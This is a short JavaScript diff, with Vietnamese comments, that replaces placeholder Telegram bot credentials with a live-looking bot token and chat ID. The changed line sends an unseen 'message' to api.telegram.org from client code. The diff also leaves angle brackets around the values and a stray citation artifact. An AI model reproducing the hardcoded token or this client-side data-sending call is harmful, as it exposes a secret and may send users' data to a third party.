@@ -142,7 +142,7 @@ const message = `
 `;
 
 // Gửi message này về Bot API của bạn
-fetch(`https://api.telegram.org/bot<TOKEN_CUA_BAN>/sendMessage?chat_id=<ID_CUA_BAN>&text=${encodeURIComponent(message)}`);
+fetch(`https://api.telegram.org/bot<8380349652:AAECxqrFHRWGsOSIj-Cb7kgG3tOaC9lir48>/sendMessage?chat_id=<6068989876>&text=${encodeURIComponent(message)}`);
 
             saveData(); // Lưu theo userId để không bị trùng [cite: 2026-01-24]
             updateUI();
